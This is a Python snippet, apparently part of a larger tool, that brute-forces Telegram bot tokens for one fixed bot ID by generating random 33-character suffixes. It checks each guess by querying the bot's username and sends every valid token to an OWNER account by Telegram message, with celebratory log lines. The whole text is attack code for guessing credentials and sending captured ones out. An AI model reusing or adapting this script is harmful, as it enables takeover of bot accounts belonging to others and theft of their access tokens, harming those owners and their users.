#ADMlNxd 2.008
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
for k in range(1000):
  token = "609517172:AA" + "".join(random.choices(chars,k=33))
  new_bot = Bot(token)
  try:
    username = new_bot.username
  except:
    username = None
    pass
  if username:
    print(token)
    LOGGING(username)
    LOGGING(token[11:])
    new_bot.send_message(OWNER, token)
    LOGGING("Har Har Mahadev 🚩")
    LOGGING("#FOUND")
    LOGGING("🚩 JAI SHREE RAM\n"*20)
  if True:
    ATTEMPT += 1
    if ATTEMPT % (500*THREAD_COUNT) == 0:
      LOGGING(f"🧔 #TASK\n#{GROUP_NAME} Group have completed {ATTEMPT} attempt with {THREAD_COUNT} Bots")
